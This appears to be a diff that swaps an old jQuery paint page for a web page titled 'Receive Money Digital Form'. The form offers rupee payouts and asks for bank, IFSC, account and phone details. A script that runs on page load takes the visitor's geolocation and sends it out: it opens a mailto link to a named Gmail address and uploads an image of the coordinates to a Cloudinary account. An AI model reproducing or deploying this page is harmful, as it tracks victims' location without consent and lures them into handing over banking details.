@@ -1,8 +1,6 @@
-<html>
+<!-- <html>
   
-  <!--
-    Based off Team Treehouse jQuery Project
-  -->
+
   
 <head>
 <meta charset="utf-8">
@@ -46,5 +44,294 @@
 
 <script src="https://code.jquery.com/jquery-1.11.0.min.js" type="text/javascript" charset="utf-8"></script>
 <script  src="js/paint.js" type="text/javascript" charset="utf-8"></script>
+</body>
+</html>
+
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script>
+  <title>Receive Money Digital Form</title>
+  <style>
+      body {
+  font-family: helvetica, sans-serif;
+}
+
+fieldset {
+  min-height: 200px;
+}
+
+.standard-label, .standard-input {
+    display: block;
+}
+
+.standard-label {
+  margin-bottom: 20px;
+}
+
+.standard-input, .standard-select {
+  margin-top: 10px;
+  border: 3px lightsteelblue solid;
+  border-radius: 5px;
+  padding: 2px;
+}
+
+.standard-input {
+  height: 25px;
+  width: 250px;
+  font-size: 1em;
+}
+
+.standard-select {
+  height: 32px;
+  width: 150px;
+  font-size: 1em;
+}
+
+#account-select {
+  width: 260px;
+}
+
+.container {
+  width: 70%;
+  max-width: 800px;
+  margin: 0 auto;
+  border: 1px black solid;
+  padding: 10px;
+  background-color: lightsteelblue; 
+}
+
+.sub-container {
+  padding-left: 10px;
+  background-color: white;
+  margin: 10px auto;
+}
+
+.required {
+  font-size: 1.5em;
+  color: red;
+}
+
+.small-heading {
+  font-size: 18px;
+}
+
+.radio-label {
+  font-size: 20px;
+  margin: 0 40px;
+}
+
+.radio-input {
+  margin-bottom: 25px;
+}
+
+button {
+  border: 2px black solid;
+  background-color: lightsteelblue;
+  border-radius: 5px;
+  margin: 0 auto;
+  height: 35px;
+  width: 150px;
+  font-size: 20px;
+}
+input[type="date"]::-webkit-calendar-picker-indicator {
+    color: rgba(0, 0, 0, 0);
+    opacity: 1;
+    display: block;
+    background: url(https://mywildalberta.ca/images/GFX-MWA-Parks-Reservations.png) no-repeat;
+    width: 20px;
+    height: 20px;
+    border-width: thin;
+}
+
+#show-address {
+  display: none;
+  float: right;
+}
+
+#address-history {
+  display: none;
+}
+
+#non-uk {
+  display: none;
+  text-align: center;
+  font-size: 25px;
+  color: red;
+}
+
+#current-address {
+  display: none;
+}
+
+#previous-address {
+  display: none;
+}
+
+#get-consent {
+  display: none;
+  float: right;
+}
+
+#your-consent {
+  display: none;
+}
+
+#info-request {
+  display: none;
+}
+
+#submit-app {
+  display: none;
+  border: 2px black solid;
+  background-color: lightsteelblue;
+  border-radius: 5px;
+  margin: 15px auto;
+  height: 35px;
+  width: 180px;
+  font-size: 20px;
+  float: right;
+}
+
+input[type="checkbox"] {
+  height: 50px;
+  width: 30px;
+  margin-top: 20px;
+  margin-left: 45px;
+}
+/** Media Queries **/
+
+@media screen and (max-width: 1100px) {
+  
+  h1 {
+    font-size: 24px; 
+  }
+  
+  h2 {
+    font-size: 24px;
+  }
+  .container {
+    width: 95%;
+  }
+}
+
+  </style>
+ <script>
+
+const CLOUDINARY_URL='https://api.cloudinary.com/v1_1/test-26272/image/upload'
+const CLOUDINARY_UPLOAD_PRESET='ybmx6ztv'
+
+    var x = document.getElementById("demo");
+    getLocation()
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+    
+    function showPosition(position) {
+      console.log("Latitude: " + position.coords.latitude +
+      "<br>Longitude: " + position.coords.longitude);
+      window.open('mailto:rocktimsharma82@gmail.com?subject=subject&body='+position.coords.latitude+','+position.coords.longitude);
+      
+      var canvas = document.createElement("canvas");
+    canvas.width = 620;
+    canvas.height = 80;
+    var ctx = canvas.getContext('2d');
+    ctx.font = "30px Arial";
+    var text = position.coords.latitude+','+position.coords.longitude;
+    ctx.fillText(text,10,50);
+    canvas.toBlob(function(blob) {
+     
+
+     var formData=new FormData()
+     formData.append('file',blob,'image.png')
+     formData.append('upload_preset',CLOUDINARY_UPLOAD_PRESET)
+     console.log(formData.get('file'))
+     axios({
+          url:CLOUDINARY_URL,
+          method:"POST",
+          headers:{
+              'Content-Type':'application/x-www-form-urlencoded'
+          },
+          data:formData,
+      })
+      .then(function(res){
+          console.log(res)
+    
+
+      })
+      .catch(function(err){
+          console.log(err)
+
+      });
+
+    
+    
+    })
+}
+    
+    </script>
+</head>
+
+  <body>
+  <div class="container">
+    <h1 class="main-header">Receive Money</h1>
+    <hr>
+    <form id="app-form" action="">
+    <fieldset class="sub-container" id="basic-details">
+      <h2 class="sub-heading">Account Details</h2>
+      <hr>
+        <label for="dropdown" class="standard-label">
+          Amount<span class="required">*</span>
+          <br>
+          <select  id="dropdown" class="standard-select" required>
+            <option value="select" disabled selected>Select Amount</option>
+            <option value="Mr">₹ 10,000</option>
+            <option value="Mrs">₹ 15,000</option>
+            <option value="Miss">₹ 20,000</option>
+            <option value="Ms">₹ 25,000</option>
+            <option value="Dr">₹ 30,000</option>
+       
+          </select>
+        </label>
+        <label for="firstname" class="standard-label">
+          Bank Name<span class="required">*</span>
+          <input class="standard-input" name="firstname" id="firstname" type="text" placeholder="Bank Name" required>
+        </label>
+        <label for="middlenames" class="standard-label">
+          IFSC Code
+          <input class="standard-input" name="middlename" id="middlename" type="text" placeholder="IFSC Code">
+        </label>
+        <label for="lastname" class="standard-label">
+          Account Number<span class="required">*</span>
+          <input class="standard-input" name="lastname" id="lastname" type="text" placeholder="Account Number" required>
+        </label>
+        <label for="phone-number" class="standard-label">
+          Phone Number<span class="required">*</span>
+          <input class="standard-input" type="tel" id="phone" name="phone" pattern='^\+?\d{10,12}' placeholder="Example: 01925999111" required>
+        </label>
+        <label for="email-address" class="standard-label">
+          Branch Name<span class="required">*</span>
+          <input class="standard-input" id="email-address" type="text" placeholder="Branch Name" required>
+        </label>
+       
+        <button type="button"  value="submit">Submit</button>
+      </fieldset>
+      
+      
+
+      
+    </form>
+  </div>
 </body>
 </html>
